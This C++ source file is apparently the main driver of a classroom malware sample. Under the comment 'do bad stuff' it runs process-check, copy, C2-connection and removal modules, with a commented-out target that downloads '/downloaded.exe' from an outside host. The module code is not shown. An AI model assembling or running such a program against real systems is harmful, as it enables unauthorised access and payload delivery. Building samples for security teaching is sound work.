// feelsbadman.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "pch.h"
#include "C2.h"
#include "CP.h"
#include "RM.h"
#include "PH.h"
#include <iostream>


int main()
{
	// instantiate modules
	CP copyModule;
	C2 connModule;// ("www.uvu-cybersecurity.com", "/downloaded.exe");
	RM remvModule;
	PH procModule;

	connModule.setPathName("/");
	connModule.setHostName("www.google.com");
	
	// do bad stuff
	procModule.hasProcesses();
	copyModule.execute();
	connModule.execute();
	remvModule.execute();
	
}

